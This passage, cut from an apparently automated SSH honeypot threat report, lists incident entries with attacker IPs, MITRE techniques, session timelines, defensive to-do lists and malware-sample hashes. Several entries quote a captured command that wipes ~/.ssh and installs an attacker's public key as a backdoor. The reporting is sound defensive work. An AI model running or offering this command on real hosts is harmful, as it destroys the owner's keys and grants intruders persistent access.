| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:49:59` | `cowrie.session.connect` |
| `2026-10-23 00:49:59` | `cowrie.client.version` |
| `2026-10-23 00:49:59` | `cowrie.client.kex` |
| `2026-10-23 00:49:59` | `cowrie.login.success` |
| `2026-10-23 00:50:00` | `cowrie.session.params` |
| `2026-10-23 00:50:00` | `cowrie.command.input` |
| `2026-10-23 00:50:00` | `cowrie.command.failed` |
| `2026-10-23 00:50:00` | `cowrie.log.closed` |
| `2026-10-23 00:50:00` | `cowrie.session.params` |
| `2026-10-23 00:50:00` | `cowrie.command.input` |
| `2026-10-23 00:50:00` | `cowrie.session.file_download` |
| `2026-10-23 00:50:01` | `cowrie.log.closed` |
| `2026-10-23 00:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.127.185[.]37` to AbuseIPDB if not already reported
- [ ] Block `20.127.185[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c48009cefd6

| Field | Detail |
|---|---|
| **Source IP** | `20.127.185[.]37` |
| **First Seen** | 2026-10-23 00:50 |
| **Last Seen** | 2026-10-23 00:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:50:01` | `cowrie.session.connect` |
| `2026-10-23 00:50:01` | `cowrie.client.version` |
| `2026-10-23 00:50:01` | `cowrie.client.kex` |
| `2026-10-23 00:50:01` | `cowrie.login.success` |
| `2026-10-23 00:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.127.185[.]37` to AbuseIPDB if not already reported
- [ ] Block `20.127.185[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b548ae49083b

| Field | Detail |
|---|---|
| **Source IP** | `97.74.87[.]152` |
| **First Seen** | 2026-10-23 00:50 |
| **Last Seen** | 2026-10-23 00:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:50:06` | `cowrie.session.connect` |
| `2026-10-23 00:50:06` | `cowrie.client.version` |
| `2026-10-23 00:50:07` | `cowrie.client.kex` |
| `2026-10-23 00:50:08` | `cowrie.login.success` |
| `2026-10-23 00:50:09` | `cowrie.session.params` |
| `2026-10-23 00:50:09` | `cowrie.command.input` |
| `2026-10-23 00:50:09` | `cowrie.command.failed` |
| `2026-10-23 00:50:09` | `cowrie.log.closed` |
| `2026-10-23 00:50:10` | `cowrie.session.params` |
| `2026-10-23 00:50:10` | `cowrie.command.input` |
| `2026-10-23 00:50:10` | `cowrie.session.file_download` |
| `2026-10-23 00:50:10` | `cowrie.log.closed` |
| `2026-10-23 00:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.87[.]152` to AbuseIPDB if not already reported
- [ ] Block `97.74.87[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5285beae3a

| Field | Detail |
|---|---|
| **Source IP** | `97.74.87[.]152` |
| **First Seen** | 2026-10-23 00:50 |
| **Last Seen** | 2026-10-23 00:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:50:11` | `cowrie.session.connect` |
| `2026-10-23 00:50:11` | `cowrie.client.version` |
| `2026-10-23 00:50:11` | `cowrie.client.kex` |
| `2026-10-23 00:50:12` | `cowrie.login.success` |
| `2026-10-23 00:50:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.87[.]152` to AbuseIPDB if not already reported
- [ ] Block `97.74.87[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49687c46254d

| Field | Detail |
|---|---|
| **Source IP** | `50.6.4[.]228` |
| **First Seen** | 2026-10-23 00:51 |
| **Last Seen** | 2026-10-23 00:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:51:28` | `cowrie.session.connect` |
| `2026-10-23 00:51:28` | `cowrie.client.version` |
| `2026-10-23 00:51:28` | `cowrie.client.kex` |
| `2026-10-23 00:51:28` | `cowrie.login.success` |
| `2026-10-23 00:51:29` | `cowrie.session.params` |
| `2026-10-23 00:51:29` | `cowrie.command.input` |
| `2026-10-23 00:51:29` | `cowrie.command.failed` |
| `2026-10-23 00:51:29` | `cowrie.log.closed` |
| `2026-10-23 00:51:30` | `cowrie.session.params` |
| `2026-10-23 00:51:30` | `cowrie.command.input` |
| `2026-10-23 00:51:30` | `cowrie.session.file_download` |
| `2026-10-23 00:51:30` | `cowrie.log.closed` |
| `2026-10-23 00:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.4[.]228` to AbuseIPDB if not already reported
- [ ] Block `50.6.4[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ac32544a61

| Field | Detail |
|---|---|
| **Source IP** | `50.6.4[.]228` |
| **First Seen** | 2026-10-23 00:51 |
| **Last Seen** | 2026-10-23 00:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:51:30` | `cowrie.session.connect` |
| `2026-10-23 00:51:30` | `cowrie.client.version` |
| `2026-10-23 00:51:30` | `cowrie.client.kex` |
| `2026-10-23 00:51:30` | `cowrie.login.success` |
| `2026-10-23 00:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.4[.]228` to AbuseIPDB if not already reported
- [ ] Block `50.6.4[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6e7c751498

| Field | Detail |
|---|---|
| **Source IP** | `87.106.65[.]126` |
| **First Seen** | 2026-10-23 00:51 |
| **Last Seen** | 2026-10-23 00:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:51:31` | `cowrie.session.connect` |
| `2026-10-23 00:51:31` | `cowrie.client.version` |
| `2026-10-23 00:51:31` | `cowrie.client.kex` |
| `2026-10-23 00:51:32` | `cowrie.login.success` |
| `2026-10-23 00:51:32` | `cowrie.session.params` |
| `2026-10-23 00:51:32` | `cowrie.command.input` |
| `2026-10-23 00:51:32` | `cowrie.command.failed` |
| `2026-10-23 00:51:33` | `cowrie.log.closed` |
| `2026-10-23 00:51:33` | `cowrie.session.params` |
| `2026-10-23 00:51:33` | `cowrie.command.input` |
| `2026-10-23 00:51:33` | `cowrie.session.file_download` |
| `2026-10-23 00:51:33` | `cowrie.log.closed` |
| `2026-10-23 00:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.65[.]126` to AbuseIPDB if not already reported
- [ ] Block `87.106.65[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b11122e053d8

| Field | Detail |
|---|---|
| **Source IP** | `87.106.65[.]126` |
| **First Seen** | 2026-10-23 00:51 |
| **Last Seen** | 2026-10-23 00:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:51:33` | `cowrie.session.connect` |
| `2026-10-23 00:51:33` | `cowrie.client.version` |
| `2026-10-23 00:51:34` | `cowrie.client.kex` |
| `2026-10-23 00:51:34` | `cowrie.login.success` |
| `2026-10-23 00:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.65[.]126` to AbuseIPDB if not already reported
- [ ] Block `87.106.65[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0d88ce7319

| Field | Detail |
|---|---|
| **Source IP** | `51.254.103[.]32` |
| **First Seen** | 2026-10-23 00:53 |
| **Last Seen** | 2026-10-23 00:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:53:30` | `cowrie.session.connect` |
| `2026-10-23 00:53:30` | `cowrie.client.version` |
| `2026-10-23 00:53:30` | `cowrie.client.kex` |
| `2026-10-23 00:53:31` | `cowrie.login.success` |
| `2026-10-23 00:53:31` | `cowrie.session.params` |
| `2026-10-23 00:53:31` | `cowrie.command.input` |
| `2026-10-23 00:53:31` | `cowrie.command.failed` |
| `2026-10-23 00:53:31` | `cowrie.log.closed` |
| `2026-10-23 00:53:32` | `cowrie.session.params` |
| `2026-10-23 00:53:32` | `cowrie.command.input` |
| `2026-10-23 00:53:32` | `cowrie.session.file_download` |
| `2026-10-23 00:53:32` | `cowrie.log.closed` |
| `2026-10-23 00:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.103[.]32` to AbuseIPDB if not already reported
- [ ] Block `51.254.103[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5dacc3cfa14

| Field | Detail |
|---|---|
| **Source IP** | `51.254.103[.]32` |
| **First Seen** | 2026-10-23 00:53 |
| **Last Seen** | 2026-10-23 00:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:53:32` | `cowrie.session.connect` |
| `2026-10-23 00:53:32` | `cowrie.client.version` |
| `2026-10-23 00:53:33` | `cowrie.client.kex` |
| `2026-10-23 00:53:33` | `cowrie.login.success` |
| `2026-10-23 00:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.103[.]32` to AbuseIPDB if not already reported
- [ ] Block `51.254.103[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d4c3a1998d2

| Field | Detail |
|---|---|
| **Source IP** | `143.20.154[.]71` |
| **First Seen** | 2026-10-23 00:54 |
| **Last Seen** | 2026-10-23 00:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:54:45` | `cowrie.session.connect` |
| `2026-10-23 00:54:45` | `cowrie.client.version` |
| `2026-10-23 00:54:45` | `cowrie.client.kex` |
| `2026-10-23 00:54:46` | `cowrie.login.success` |
| `2026-10-23 00:54:46` | `cowrie.session.params` |
| `2026-10-23 00:54:46` | `cowrie.command.input` |
| `2026-10-23 00:54:46` | `cowrie.command.failed` |
| `2026-10-23 00:54:46` | `cowrie.log.closed` |
| `2026-10-23 00:54:47` | `cowrie.session.params` |
| `2026-10-23 00:54:47` | `cowrie.command.input` |
| `2026-10-23 00:54:47` | `cowrie.session.file_download` |
| `2026-10-23 00:54:47` | `cowrie.log.closed` |
| `2026-10-23 00:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.20.154[.]71` to AbuseIPDB if not already reported
- [ ] Block `143.20.154[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6560202c6241

| Field | Detail |
|---|---|
| **Source IP** | `143.20.154[.]71` |
| **First Seen** | 2026-10-23 00:54 |
| **Last Seen** | 2026-10-23 00:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:54:47` | `cowrie.session.connect` |
| `2026-10-23 00:54:47` | `cowrie.client.version` |
| `2026-10-23 00:54:47` | `cowrie.client.kex` |
| `2026-10-23 00:54:48` | `cowrie.login.success` |
| `2026-10-23 00:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.20.154[.]71` to AbuseIPDB if not already reported
- [ ] Block `143.20.154[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `116.206.193[.]37` | 1 | 2026-10-23 00:42 | 2026-10-23 00:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-23 00:54 | 2026-10-23 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-23 00:18 | 2026-10-23 00:18 | 44s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]229` | 1 | 2026-10-23 00:40 | 2026-10-23 00:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.65.149[.]233` | 1 | 2026-10-23 00:31 | 2026-10-23 00:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `181.46.185[.]210` | 1 | 2026-10-23 00:36 | 2026-10-23 00:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-23 00:14 | 2026-10-23 00:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-23 00:23 | 2026-10-23 00:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-10-23 00:01 | 2026-10-23 00:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.108.202[.]22` | 1 | 2026-10-23 00:37 | 2026-10-23 00:37 | 28s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-23 00:15 | 2026-10-23 00:15 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
